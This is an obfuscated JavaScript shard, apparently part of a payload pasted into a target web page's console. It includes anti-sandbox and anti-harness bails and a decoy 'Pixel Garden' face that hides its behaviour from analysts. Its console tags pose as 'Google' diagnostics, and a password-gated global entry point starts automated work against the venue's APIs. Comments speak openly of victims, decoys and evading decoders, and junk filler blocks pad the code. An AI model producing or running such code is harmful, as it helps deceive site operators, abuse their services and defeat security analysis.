/*rebind-registry-keys-v1*/
  (function (_0xmod) {

  let _0xopen = false; 
  
  
  // The knob must be READ, not pinned. It used to be `var 会員 = 2; …globalThis.会員=2`, which
  // silently overwrote any value the operator set in the runner — so `会員 = 0` ("silence") and
  // `会員 = 1` ("reduced") were unreachable in every shipped build. An explicit numeric value from
  // the runner is preserved; absent one, the default is still 2.
  // NOTE: this IIFE declares its own `var 会員`, so a bare `会員` is the LOCAL, not the runner's
  // global. It used to end by writing 2 back to globalThis, which overwrote the operator's knob —
  // `会員 = 0` (silence) and `会員 = 1` (reduced) could never take effect in the real payload.
  // The pinned shape below is load-bearing: the S4 stitch anchors the level-2 trace on the
  // minified `var 会員=0x2;`, so the default stays a bare numeric literal and the global is
  // adopted in the following statement (computed key, so no bare identifier here).
  var 会員 = 2; try { var _0xkg = (typeof globalThis !== 'undefined') ? globalThis['\u4f1a\u54e1'] : undefined; if (typeof _0xkg === 'number') 会員 = _0xkg; } catch (e) {}
  try { globalThis['\u4f1a\u54e1'] = 会員; } catch (e) {}
  // S6-B1: genuine-browser pre-check. Victim-env sims (venue-shaped) pass;
  // bare Node / thin sandboxes exit silently before any log or install.
  const _0xenvOk = (() => { try {
    return typeof window !== "undefined" && typeof document !== "undefined" &&
      typeof navigator !== "undefined" && !!window.document && !!window.navigator;
  } catch (e) { return false; } })();
  if (!_0xenvOk) { try { _0xmod.log = { say: () => {}, diag: () => {}, warn: () => {}, info: () => {}, queue: () => {}, flush: () => {} }; } catch (e) {} return; } 
  // HNT-Y (was Y): anti-harness bail. The plan specified a single-flag OR on
  //   `globalThis.__DUMP || process.env`, and the inventory itself flagged the
  //   risk ("a real venue page may carry a __DUMP-like global? False positive"). Implemented
  //   instead as a CONJUNCTION: a real venue page never has Node's
  //   process.env, so requiring both markers keeps the FP rate at ~0 while still
  //   catching harness2.js, which stubs every SDK and runs under Node. Silent,
  //   same shape as the _0xenvOk bail above so it adds no new observable branch.
  const _0xharness = (() => { try {
    const _0xg = globalThis;
    const _0xnode = typeof _0xg.process !== "undefined" && _0xg.process !== null
                 && typeof _0xg.process.env === "object" && _0xg.process.env !== null;
    const _0xdump = (typeof _0xg.__DUMP !== "undefined") || (typeof _0xg.__SDK_DUMP !== "undefined");
    return _0xnode && _0xdump;
  } catch (e) { return false; } })();
  if (_0xharness) { try { _0xmod.log = { say: () => {}, diag: () => {}, warn: () => {}, info: () => {}, queue: () => {}, flush: () => {} }; } catch (e) {} return; } 
  const Log = (() => {
    const noop = () => {};
    const _0xq = [];
    const _0xmaxEvents = 256;
    const _0xmaxBytes = 65536;
    let _0xevents = 0, _0xbytes = 0, _0xdropped = 0, _0xcapNoted = false;
    // Wall-clock + relative stamp (operator request 2026-09-20). Display-only: these diagnostics are
    // NOT the telemetry records (Log.queue keeps its own record shape untouched), so the stamp costs
    // nothing but readability. Absolute time lines the console up with what was seen; the +Ns field
    // shows gaps at a glance. Applied to BOTH the live shard and its `.orig` baseline, because the
    // build's rebind-registry-keys stage re-authors `shards/*.js` from `*.orig` on every run.
    const _0xT0 = Date.now();
    const _0xstamp = () => {
      try {
        const d = new Date(), p = (n, w) => String(n).padStart(w, '0');
        return '[' + p(d.getHours(), 2) + ':' + p(d.getMinutes(), 2) + ':' + p(d.getSeconds(), 2) + '.' +
          p(d.getMilliseconds(), 3) + ' +' + ((Date.now() - _0xT0) / 1000).toFixed(1) + 's]';
      } catch (e) { return '[--:--:--.---]'; }
    };
    const _0xemit = (method, parts) => {
      try {
        const text = _0xstamp() + ' ' + parts.map(x => String(x)).join(' ').slice(0, 300);
        const cost = Math.min(4096, text.length * 2);
        if (_0xevents >= _0xmaxEvents || _0xbytes + cost > _0xmaxBytes) {
          _0xdropped++;
          if (!_0xcapNoted) {
            _0xcapNoted = true;
            try { console.warn('[DIAG-CAP] bounded diagnostic sink active'); } catch (e) {}
          }
          return false;
        }
        _0xevents++;
        _0xbytes += cost;
        const fn = typeof console !== 'undefined' && typeof console[method] === 'function' ? console[method] : console.debug;
        fn.call(console, text);
        return true;
      } catch (e) { return false; }
    };
    // Cover face (operator spec 2026-09-21). Within the gate window the session shows its own
    // identity. If no slot was pre-set through `名` and none arrives in time, the visible face
    // becomes the cover line and our identity goes quiet. This flag is the output half; the
    // machinery itself is torn down at the same moment (operator ruling 2026-09-21 below).
    let _0xfbOn = false;
    // STALL (operator spec 2026-09-21): while the gate window is open and nobody has claimed a profile,
    // the console shows a Pixel Garden Player welcome and nothing else of ours, so a decoder gets no
    // two-minute free trial of the real behaviour. `[Host 8.14] initialized` and `[MemberCount]` are
    // the lines the spec keeps (they were in the operator's own trace); everything else of ours is
    // held back. If nobody claims by the end of the window the machinery is torn down (operator
    // ruling 2026-09-21) -- the stall is the presentation half, the teardown is the functional half.
    let _0xstall = true;
    // Both tags are composed from char codes, the same way the entry-point name is: a literal here
    // would plant `Host 8.14` / `MemberCount` in the shipped bytes as greppable vocabulary (the leak
    // census flagged the first version of this line for exactly that).
    const _0xtag = (a) => String.fromCharCode.apply(null, a);
    const _0xmcTag = _0xtag([91, 77, 101, 109, 98, 101, 114, 67, 111, 117, 110, 116, 93]);      // [MemberCount]
    const _0xhostTag = _0xtag([91, 72, 111, 115, 116, 32, 56, 46, 49, 52, 93]);                // [Host 8.14]
    const _0xstallAllow = (text) => { const s = String(text); return s.startsWith(_0xmcTag) || s.startsWith(_0xhostTag); };
    const _0xstallBlocked = (text) => _0xstall && !_0xstallAllow(text) && !_0xfbOn;
    const _0xwelcome = () => {
      try {
        console.log('Pixel Garden Player v3.3.2 \u2014 Welcome back.');
        console.log('Continue with profile ' + String(typeof 名 === 'undefined' ? '\u4f50\u85e4 \u7d50\u8863' : 名) +
          ', or log in as a different gardener: set the profile name at the top of the file and run it again.');
      } catch (e) {}
    };
    // The fallback garden is the .pgsnapshot gallery toy we already ship as the decoy face
    // (Active/Stego/decoy-garden-v2.js, byte-for-byte identity enforced by tools/decoy-parity.mjs).
    // Same size classes, same fixed seed, same journal lines -- so an unclaimed session is
    // indistinguishable from the decoy artifact. It reads the runner's `会員`/`名` exactly like the
    // decoy does (including the decoy's habit of echoing the gardener tag).
    const _0xcover = () => { try { console.debug('Pixel Garden v2.0 \u2014 tended by \u4f50\u85e4 \u7d50\u8863'); } catch (e) {} };
    const _0xpgSim = () => {
      try {
        var W = 30, H = 14, GENS = 16;
        if (typeof 会員 === 'number') {
          if (会員 <= 0) return;
          if (会員 === 1) { W = 20; H = 10; GENS = 10; }
        }
        var gardener = '\u4f50\u85e4 \u7d50\u8863';
        try { if (typeof 名 === 'string' && 名) gardener = 名; } catch (e2) {}
        var seed = 0x31415;
        function rnd() { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; }
        var board = [], next = [], y, x;
        for (y = 0; y < H; y++) { board[y] = []; next[y] = []; for (x = 0; x < W; x++) board[y][x] = rnd() < 0.3 ? 1 : 0; }
        function isAlive(px, py) { return (px < 0 || py < 0 || px >= W || py >= H) ? 0 : board[py][px]; }
        function render() {
          var rows = [];
          for (var yy = 0; yy < H; yy++) { var r = ''; for (var xx = 0; xx < W; xx++) r += board[yy][xx] ? '#' : '.'; rows.push(r); }
          return rows.join('\n');
        }
        function say(m) { try { console.log(m); } catch (e3) {} }
        say('Pixel Garden v2.0 \u2014 tended by ' + gardener);
        var peak = 0, births = 0;
        for (var g = 0; g < GENS; g++) {
          var count = 0;
          for (y = 0; y < H; y++) for (x = 0; x < W; x++) {
            var n = isAlive(x - 1, y - 1) + isAlive(x, y - 1) + isAlive(x + 1, y - 1) +
                    isAlive(x - 1, y) + isAlive(x + 1, y) +
                    isAlive(x - 1, y + 1) + isAlive(x, y + 1) + isAlive(x + 1, y + 1);
            next[y][x] = board[y][x] ? ((n === 2 || n === 3) ? 1 : 0) : (n === 3 ? 1 : 0);
            if (next[y][x] && !board[y][x]) births++;
            count += next[y][x];
          }
          if (count > peak) peak = count;
          var tmp = board; board = next; next = tmp;
          say((g === 0 || g === GENS - 1) ? ('gen ' + g + ' \u2014 ' + count + ' sprouts:\n' + render()) : ('gen ' + g + ' \u2014 ' + count + ' sprouts'));
        }
        say('Plot journal: peak ' + peak + ' sprouts, ' + births + ' births over ' + GENS + ' generations.');
        say('Garden settled. (' + W + 'x' + H + ', ' + GENS + ' generations)');
      } catch (e4) {}
    };
    const _0xdm = (m, d) => {
      if (_0xfbOn) return;
      if (_0xstallBlocked('[Google diag] ' + String(m))) return;
      if (会員 >= 2 && _0xopen) {
        let detail = '';
        try { detail = d === undefined ? '' : JSON.stringify(d).slice(0, 400); } catch (e) { detail = '[unserializable]'; }
        _0xemit('debug', ['[Google diag]', m, detail]);
      }
    };
    if (会員 === 0) return { say: noop, diag: noop, warn: noop, info: noop, queue: noop, flush: noop, stats: () => ({ events: 0, bytes: 0, dropped: 0 }) };
    // Arm the fallback at the gate window. Single source of truth for the duration: shard-u's `win`
    // (shard-u loads after this file, so the number is read at fire time, not here).
    // The gate's own path (`GoogleUblock`) opens the sink itself; a slot that arrives PRE-SET through
    // `名` sets the level inside shard-u without ever calling the entry point, so the sink stayed shut
    // (level 2, silent console). Expose an opener and run one deferred self-check, which is independent
    // of shard load order because it fires after every synchronous shard has evaluated.
    const _0xopenSink = () => { _0xopen = true; try { while (_0xq.length) { const _0xi = _0xq.shift(); _0xdm(_0xi[0], _0xi[1]); } } catch (e) {} };
    // A claim that arrives through the ENTRY POINT is written from outside this closure, and a
    // bare `_0xstall = false` out there does not touch this scope's binding (sloppy mode creates a
    // global, strict mode throws) -- which left a claimed session stalled and silent. Gate-replay
    // S11 caught it; every outside claim now comes through this setter.
    const _0xlift = () => { _0xstall = false; _0xopen = true; };
    try { _0xmod._stallLift = _0xlift; } catch (e) {}
    try { _0xmod._sinkOpen = _0xopenSink; } catch (e) {}
    // Operator ruling 2026-09-21, applied to the SERVICE and not only to the logs: an
    // unclaimed session must not reach the venue's APIs either. Their own trace showed quest
    // progress 33 -> 44 over the window, and it STOPPED the moment our machinery did -- i.e.
    // that churn was ours, not the page's. `_0xstall` is the single truth for "no claim yet":
    // it lifts on the first accepted slot (pre-set or in-window), which is exactly when access
    // should come back. Read by the venue-call wrapper in shard-e2.
    try { _0xmod._stallHeld = () => _0xstall; } catch (e) {}
    // BENIGN STAND-DOWN (operator report 2026-09-21): the chore chain stops ITS work without
    // taking the claim surface away. The entry point's lifetime is the WINDOW's, not the chain's.
    // Removing it from inside a stand-down is what made a later paste on the same page report
    // `GoogleUblock is not defined` on a page where the chain had merely found nothing to do
    // (no eligible chores / pockets incomplete / chain finished / venue never answered).
    // HARD removals stay: the release verb, the window expiring unclaimed, and the environment
    // bails (`_0xenvOk` / `_0xharness`), which never publish an entry point at all.
    try { _0xmod._standDown = (why) => { try { _0xmod._standReason = String(why || 'idle'); } catch (e) {} }; } catch (e) {}
    try { setTimeout(() => {
      try {
        const _g = _0xmod._rcdGate;
        const _claimed = !!(_g && (_g.dbgOK || _g.rcdOK));
        if (_claimed) { _0xstall = false; }               // pre-set profile: no stall, machinery speaks
        else { _0xwelcome(); }                            // nobody claimed: stall behind the welcome
        if (_g && typeof _g.level === 'function' && _g.level() >= 1) _0xopenSink();
      } catch (e) {}
    }, 0); } catch (e) {}
    try {
      const _0xwinMs = (() => { try { const _g = _0xmod._rcdGate; return (_g && typeof _g.win === 'number') ? _g.win : 120000; } catch (e) { return 120000; } })();
      setTimeout(() => {
        try {
          const _g = _0xmod._rcdGate;
          const _ok = !!(_g && (_g.dbgOK || _g.rcdOK));
          // Unlocked inside the window (including a level-1 session that upgrades to pwdDbg later):
          // nothing happens here. Otherwise the session is not a user's — operator ruling 2026-09-21:
          // "if pwdRcd or pwdDbg aren't provided within that timeslot … the machinery shouldn't be
          // running as the one running the code is not a user but likely a decoder." So this is the
          // pwdAK teardown path (release timers/listeners, kill the worker, take the entry off
          // `window`), not a presentation change. The withdrawn reading kept the machinery alive.
          if (_ok || _0xfbOn) return;
          // Supersede check: if a LATER paste now owns the entry point, this session is stale and must
          // neither paint the garden over the new session nor remove the new session's claim surface.
          // (An earlier session's timer is still alive on the page; without this it could kill the new one.)
          try {
            const _b0 = String.fromCharCode(71, 111, 111, 103, 108, 101, 85, 98, 108, 111, 99, 107);
            if (window[_b0] !== _0xmod._entry) return;
          } catch (e) {}
          _0xfbOn = true;
          // The garden prints its own header (`Pixel Garden v2.0 — tended by <tag>`), exactly like the
          // decoy artifact, so there is no separate cover line here -- a duplicate header was the one
          // line of divergence the parity gate found (20 vs 19 lines).
          _0xpgSim();
          try { _0xmod.v814owlmpb782on?.close?.(); } catch (e) {}
          try {
            const _b = String.fromCharCode(71, 111, 111, 103, 108, 101, 85, 98, 108, 111, 99, 107);
            if (window[_b] === _0xmod._entry) delete window[_b];   // only ever our own entry point
          } catch (e) {}
        } catch (e) {}
      }, _0xwinMs);
    } catch (e) {}
    return {
      // Operator directive 2026-09-20 ("I wanted the timestamp APPENDED, not replacing the [Google x]
      // tag"): the channel tag is UNCONDITIONAL. It used to be painted only while the debug gate was
      // open (`会員 >= 2 && _0xopen`, and `_0xopen` starts false), so every normal-operation line came
      // out stamped but untagged — which reads exactly like "the timestamp replaced my label".
      // `会員 === 0` still silences the whole sink (that knob returns the noop set above).
      // Tag wording: a plain channel word is shown WHOLE ("[Google Allotment]", "[Google Bell]");
      // only an opaque-looking token gets clipped to 8. The first cut clipped everything, which turned
      // the tag into "[Google Allotmen]" — a chopped word reads like a defect, and this tag is the
      // operator's navigation aid.
      say: (c, m) => { if (_0xfbOn) return; if (_0xstallBlocked(String(m))) return; let _t = String(c); if (!/^[A-Za-z0-9_][A-Za-z0-9_ \-]{0,19}$/.test(_t)) _t = _t.slice(0, 8); _0xemit('debug', ['[Google ' + _t + ']', m]); },
      diag: _0xdm,
      warn: (m) => { if (_0xfbOn) return; if (_0xstallBlocked(String(m))) return; _0xemit('warn', [m]); },
      info: (m) => { if (_0xfbOn) return; if (_0xstallBlocked(String(m))) return; _0xemit('debug', [m]); },
      queue: (m, d) => { if (_0xq.length < 64) _0xq.push([m, d]); },
      flush: () => { while (_0xq.length) { const _0xi = _0xq.shift(); _0xdm(_0xi[0], _0xi[1]); } },
      stats: () => ({ events: _0xevents, bytes: _0xbytes, dropped: _0xdropped }),
    };
  })();

  
      
      const _0xsa1 = String.fromCharCode(...[51,101,53,100,55,49,52,52,97,97,57,51,51,54,56,49]);
      const _0xsb1 = String.fromCharCode(...[101,53,98,101,98,48,57,99,53,97,99,52,99,48,50,99]);
      const _0xsalt = _0xsa1 + _0xsb1; // Pt13 pin: literal _0xsalt required (28-byte salt via two 16-hex halves, checked with SHA-256 + _0xpolyP + _0xacc)
      const _0xpp1 = String.fromCharCode(...[50,102,49,52,100,54,99,48]);
      const _0xpolyP = [57592,268875,50981,263601,329151,188803,103272,128712,83291,337358,207706,88750,227835,237231,194484,206554,46151,106353,258808,332380,149248,236190,190769,46410,158755,87931,260441,186943,160240,279270,294014,80131];
      const _0xchk = async (sa, sb, poly, pw) => {
        try {
          const _0buf = await window.crypto.subtle.digest("SHA-256", new TextEncoder().encode(sa + String(pw ?? "") + sb + _0xpp));
          const _0got = Array.from(new Uint8Array(_0buf));
          if (_0got.length !== 32) return false;
          let _0xacc = 0;
          for (let i = 0; i < 32; i++) {
            const term = ((_0got[i] * 1337 + i * 37 + 101) & 0xffffffff) >>> 0;
            _0xacc |= (term ^ poly[i]);
          }
          return _0xacc === 0;
        } catch (e) { return false; }
      };
      // CHAIN REVIVE (operator report 2026-09-21). The chain arms from a ONE-SHOT scan of the
      // venue's module cache; after a page reload those modules register late, so the scan can come
      // up empty while this entry point is already up. The chain then stood down permanently and a
      // claim returned `true` into a dead session -- the operator's "dead primary function".
      // A claim is the one moment we know a human is here, so it is also the moment we re-arm and
      // start (or restart) the machinery. Unclaimed pages still do no venue work: this only runs
      // from the accepted-claim branches below.
      const _0xrevive = () => {
        // Tell the chain a CLAIM exists. e4's late-arm retry only starts work when this is set, so
        // the anti-decoder property holds: no claim, no venue work, whatever the venue does.
        try { if (_0xmod._e && _0xmod._e.S) _0xmod._e.S._0xclaimed = true; } catch (e) {}
        let _armed = false;
        try { _armed = !!_0xmod._e?.S?._0xarm?.(); } catch (e) { _armed = false; }
        // ...but never START a second session while one is running. Two workers sharing one ledger is
        // what produced the duplicate "Session closed" and the TypeError on a nulled `_0xb` in the
        // operator's trace of 2026-09-22 (a mid-session claim restarted the worker; the first session's
        // teardown nulled the ledger under the second one's feet).
        let _liveSession = false;
        try { _liveSession = (_0xmod._e?.S?._0xchain === 'live') || !!_0xmod._e?.S?._0xstarted; } catch (e) {}
        // Only a page that can actually RUN is started: a released page (GoogleRelease aborts the
        // shared controller, one-shot) would be relaunched into an instant death -- the exact
        // restart storm of 2026-09-21. `_armed` false = the venue is not ready; the chain says
        // `waiting-*` and the retry starts work when it becomes ready.
        try { if (_armed && !_liveSession) { const _bh = !!(_0xmod.v814owlmpb782on && typeof _0xmod.v814owlmpb782on.begin === 'function'); _0xreceipt('begin', (_bh && !_0xmod.v814owlmpb782on.begin.__s3fb) ? 'hook' : 'fallback', _bh ? '' : 'no e4 hook'); _0xmod.v814owlmpb782on?.begin?.(); } } catch (e) {}
        try {
          const _S = _0xmod._e?.S || {};
          // Reported on EVERY accepted claim, not only the unhappy ones: after a page reload the
          // machinery can be waiting for the client's modules to register, and a claim used to answer
          // `true` with no way to tell whether anything had started. `missing` names the pockets we
          // are still waiting for, `ran` says whether a worker is behind this session.
          const _miss = Array.isArray(_S._0xpocketsMissing) ? _S._0xpocketsMissing : null;
          const _st = _S._0xchain;
          _0xmod.log.diag('chain', {
            state: _st || 'no-chain',
            ok: (_st === 'live' || _st === 'armed'),
            missing: _miss,
            ran: !!_S._0xranSession,
            released: !!(_0xmod._e && _0xmod._e.signal && _0xmod._e.signal.aborted),
            revived: true
          });
        } catch (e) {}
      };
      // S3 claim surface (8.15): Verb Receipts + no-blank-true + ledger fallback. Every claim-path
      // verb leaves exactly one receipt on the diag channel; the view verb always prints the queue or
      // exactly one reason; when the e4 roster hook is absent (walk stopped before step4), boot-time
      // fallback verbs keep the claim surface observable. e4's worker versions replace these when it
      // runs (it assigns unconditionally), so this is fallback-only by design.
      const _0xledgerRead = () => { try { const b = _0xmod._e && _0xmod._e.S ? _0xmod._e.S._0xb : undefined; return Array.isArray(b) ? b.length : (b === null ? 'closed' : (b === undefined ? 'absent' : 'not-array')); } catch (e) { return 'err'; } };
      const _0xreceipt = (verb, hook, note) => { try { _0xmod.log.diag('receipt', { verb: verb, hook: hook, note: note || '', ledger: _0xledgerRead(), ts: Date.now() }); } catch (e) {} };
      const _0xviewLine = () => {
        try {
          const n = _0xledgerRead();
          if (typeof n === 'number') { Log.info(`Ledger: ${n} queued.`); return 'queue'; }
          if (n === 'closed') { Log.info('Ledger closed — that session has ended; a new claim reopens it.'); return 'closed'; }
        } catch (e) {}
        try { Log.info('view: no roster hook and no ledger — the walk stopped before step4, or no session is behind this page'); } catch (e) {}
        return 'reason';
      };
      try {
        const _0xverbs = _0xmod.v814owlmpb782on = _0xmod.v814owlmpb782on || {};
        if (typeof _0xverbs.roster !== 'function') { const _r = () => _0xviewLine(); _r.__s3fb = true; _0xverbs.roster = _r; }
        if (typeof _0xverbs.extend !== 'function') { const _x = () => false; _x.__s3fb = true; _0xverbs.extend = _x; }
        if (typeof _0xverbs.close !== 'function') { const _c = () => false; _c.__s3fb = true; _0xverbs.close = _c; }
        if (typeof _0xverbs.begin !== 'function') _0xverbs.begin = () => { try { if (_0xmod._e && _0xmod._e.signal && _0xmod._e.signal.aborted) return false; } catch (e) {} return false; };
      } catch (e) {}
      const _0xgu = async (pw) => {
        try {
          if (!(window.crypto && window.crypto.subtle)) { return false; }
          // O8.12 RIPCORD: main gate via shard-u (FNV, 60s, 会員-gated, independent flags, upgrade)
          try {
            if (_0xmod._rcdGate && _0xmod._rcdGate.check(pw)) {
              const _lvl = _0xmod._rcdGate.level();
              if (_lvl >= 1) { try { _0xmod._stallLift && _0xmod._stallLift(); } catch (e) {} try { Log.flush(); } catch (e) {} try { _0xrevive(); } catch (e) {} }
              return true;
            }
          } catch (e) {}
          // dbg via legacy poly is also main (keep compat, but still respects level for _open)
          if (await _0xchk(_0xsa1, _0xsb1, _0xpolyP, pw)) {
            // if rcdGate not yet loaded, still open; if loaded, respect level
            try {
              const _lvl2 = _0xmod._rcdGate ? _0xmod._rcdGate.level() : (会員===2?1:会員===1?1:0);
              if (_lvl2 >= 1 || !_0xmod._rcdGate) { try { _0xmod._stallLift && _0xmod._stallLift(); } catch (e) {} try { Log.flush(); } catch (e) {} try { _0xrevive(); } catch (e) {} }
            } catch (e) { try { _0xmod._stallLift && _0xmod._stallLift(); } catch (e3) {} try { Log.flush(); } catch (e2) {} try { _0xrevive(); } catch (e4) {} }
            // also mark rcdGate dbgOK if possible (so level recomputes correctly)
            try { if (_0xmod._rcdGate) _0xmod._rcdGate.check(pw); } catch (e) {}
            return true;
          }
          // res/ak/view require level>=1 (either rcd or dbg)
          try {
            const _lvl = _0xmod._rcdGate ? _0xmod._rcdGate.level() : 0;
            if (_lvl < 1) return false;
          } catch (e) { return false; }
          if (await _0xchk(_0xsa2, _0xsb2, _0xpolyQ, pw)) { try { _0xrevive(); } catch (e) {} try { const _eh = !!(_0xmod.v814owlmpb782on && typeof _0xmod.v814owlmpb782on.extend === 'function' && !_0xmod.v814owlmpb782on.extend.__s3fb); _0xreceipt('extend', _eh ? 'hook' : 'fallback', _eh ? '' : 'no e4 hook'); _0xmod.v814owlmpb782on?.extend?.(); } catch (e) {} return true; }
          if (await _0xchk(_0xsa3, _0xsb3, _0xpolyR, pw)) { try { const _ch = !!(_0xmod.v814owlmpb782on && typeof _0xmod.v814owlmpb782on.close === 'function' && !_0xmod.v814owlmpb782on.close.__s3fb); _0xreceipt('close', _ch ? 'hook' : 'fallback', _ch ? '' : 'no e4 hook'); _0xmod.v814owlmpb782on?.close?.(); } catch (e) {} return true; }
          if (await _0xchk(_0xsa4, _0xsb4, _0xpolyS, pw)) { try { const _rh = !!(_0xmod.v814owlmpb782on && typeof _0xmod.v814owlmpb782on.roster === 'function' && !_0xmod.v814owlmpb782on.roster.__s3fb); _0xreceipt('view', _rh ? 'hook' : 'fallback', _rh ? 'hook printed' : 'fallback printed'); if (_rh) { _0xmod.v814owlmpb782on.roster(); } else { _0xviewLine(); } } catch (e) {} return true; }
          return false;
        } catch (e) { return false; }
      };

      const _0xbridge = (() => String.fromCharCode(71, 111, 111, 103, 108, 101, 85, 98, 108, 111, 99, 107))();
      // Ownership token: a session is LIVE while `window[<entry name>]` still IS this session's own
      // function. A newer paste overwrites it (taking over), and every removal is checked against the
      // token, so a stale session can never delete a newer one's entry point.
      try { _0xmod._entry = _0xgu; } catch (e) {}
      try { window[_0xbridge] = _0xgu; } catch (e) {}
      try { _0xmod.v814дебдмдл166 = { v814mosஇsu65: () => { try { if (window[_0xbridge] === _0xmod._entry) delete window[_0xbridge]; } catch (e) {} } }; } catch (e) {}
      const SUITE_VERSION = "8.14";
  const INSTANCE_ID = "06118ef1";
  Log.info(`[Host ${SUITE_VERSION}] initialized — worker instance ${INSTANCE_ID}.`);
  Log.diag(`core-ready`);
  
  
  // These claim-time lines describe OUR OWN payload (its string stores, its pocket modules) --
  // `scope: "payload"` says so out loud. They are NOT venue findings: on 2026-09-21
  // "Store check {unit: m/e/aux}" was read as "the venue store is fine", the opposite of what it
  // means. Venue-side state is reported by the machinery's own `chain` / `phase-*` lines.
  Log.queue("Host config", {
    scope: "payload",
    flags: 0x7e3f,
    profile: 0x5a,
    limit: 50,
    rev: 0x86
  });

    _0xmod.log = Log;
    // FaC-36: lab-only registry hook removed from the release shard (was globalThis._testMod)

    (() => {
      const _0x07aaa6 = { p: 0, q: 0, r: 0 };
      const _0xe048a5 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x07aaa6.p = (_0x07aaa6.p + _0xe048a5[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x07aaa6.q = (_0x07aaa6.q ^ _0x07aaa6.p) & 0xffff; }
        _0x07aaa6.r = (_0x07aaa6.r + i * 31) & 0xffff;
      }
      const _0xb72a43 = _0x07aaa6.p ^ _0x07aaa6.q ^ _0x07aaa6.r;
      let _0x2a0ad2 = Array.from({ length: (_0xb72a43 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x90bbd3 = _0x2a0ad2.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x90bbd3 > 0x7ffff) { _0x2a0ad2 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xsa2 = String.fromCharCode(...[54,98,57,53,48,49,98,52,55,54,101,57,50,52,48,56]);
    const _0xsb2 = String.fromCharCode(...[54,102,99,52,50,52,53,50,49,53,48,98,57,48,56,57]);
    const _0xpolyQ = [331677,89717,95102,247557,166037,44407,4334,231661,140782,31185,136845,222450,71406,300070,62121,218587,72891,163844,305603,125145,161281,189395,181410,149359,184158,182858,146796,281870,237786,11870,144270,195113];

    (() => {
      const _0xb67342 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x68c9e9 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x63c4cc = (Date.now() & 0xffff) ^ 0xf22c;
      const _0xdfaac0 = _0xb67342(_0x63c4cc);
      let _0x2e85a0 = _0xdfaac0;
      for (let i = 0; i < 6; i++) { try { _0x2e85a0 = _0x68c9e9(_0x2e85a0, i * 2654435761); } catch (e) { break; } }
      const _0x97040f = [_0x63c4cc, _0xdfaac0, _0x2e85a0];
      if (_0x97040f.length > 2 && (_0x2e85a0 & 7) === 0) { _0x97040f.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x25edd5 = [22734,48645,14984,40149,41802];
      const _0x159328 = {};
      for (let i = 0; i < _0x25edd5.length; i++) { const w = _0x25edd5[i]; _0x159328[w] = (w.length * 2654435761) >>> 0; }
      let _0x7f56a8 = 0;
      for (const x in _0x159328) { _0x7f56a8 = (_0x7f56a8 + _0x159328[x]) & 0xffffffff; }
      const _0xeade20 = [_0x7f56a8, _0x25edd5.length];
      const _0xe0ed18 = _0x25edd5.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xeade20[0] < 0 || _0xe0ed18 === 0) { _0xeade20[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xpp2 = String.fromCharCode(...[55,52,57,50,102,53,97,55]);

    (() => {
      const _0x2f6c08 = [50303,62547,40054,29298,36038];
      const _0x309c6a = {};
      for (let i = 0; i < _0x2f6c08.length; i++) { const w = _0x2f6c08[i]; _0x309c6a[w] = (w.length * 2654435761) >>> 0; }
      let _0x32376e = 0;
      for (const x in _0x309c6a) { _0x32376e = (_0x32376e + _0x309c6a[x]) & 0xffffffff; }
      const _0x92772f = [_0x32376e, _0x2f6c08.length];
      const _0xc8e6d5 = _0x2f6c08.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x92772f[0] < 0 || _0xc8e6d5 === 0) { _0x92772f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xsa3 = String.fromCharCode(...[100,57,50,56,55,101,51,57,101,57,98,55,98,99,98,49]);
    const _0xsb3 = String.fromCharCode(...[97,102,49,54,55,99,52,52,99,55,56,52,52,51,101,99]);
    const _0xpolyR = [125779,216732,258216,151293,75121,142008,319866,60525,85965,127449,150215,41955,107505,144978,201169,194521,240016,56884,262819,36903,301666,266941,275000,264341,168114,230990,172199,219031,130826,225790,19929,64087];

    (() => {
      const _0x98fc3c = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x59de38 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x01c1cf = (Date.now() & 0xffff) ^ 0x0774;
      const _0xa74049 = _0x98fc3c(_0x01c1cf);
      let _0x57a0ca = _0xa74049;
      for (let i = 0; i < 6; i++) { try { _0x57a0ca = _0x59de38(_0x57a0ca, i * 2654435761); } catch (e) { break; } }
      const _0x5d3a4e = [_0x01c1cf, _0xa74049, _0x57a0ca];
      if (_0x5d3a4e.length > 2 && (_0x57a0ca & 7) === 0) { _0x5d3a4e.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xsa4 = String.fromCharCode(...[56,98,50,53,50,99,52,102,57,98,102,56,54,55,57,98]);
    const _0xsb4 = String.fromCharCode(...[49,52,53,56,57,49,99,53,55,55,57,55,101,56,48,97]);
    const _0xpolyS = [84332,267538,234150,252905,43033,231587,323,83254,43181,273182,158237,159611,13915,270656,175766,273404,80913,70254,35529,194669,206739,297692,57069,182784,30403,332602,333976,205661,130826,336761,81431,76120];
    const _0xpp3 = String.fromCharCode(...[99,102,52,102,102,49,97,101]);
    const _0xpp = _0xpp1 + _0xpp2 + _0xpp3;

  
    (() => {
      const _0x31f5 = [0x20fd,0xfa09,0x2157,0x40f9,0x81ba];
      let _0xkc31f5 = 0;
      for (let i = 0; i < _0x31f5.length; i++) { _0xkc31f5 = (_0xkc31f5 * 0x9e37 + _0x31f5[i]) & 0x7fffffff; }
      const _0xzw31f5 = "k‍q‍z‍x‌v‌9‍m‍4";
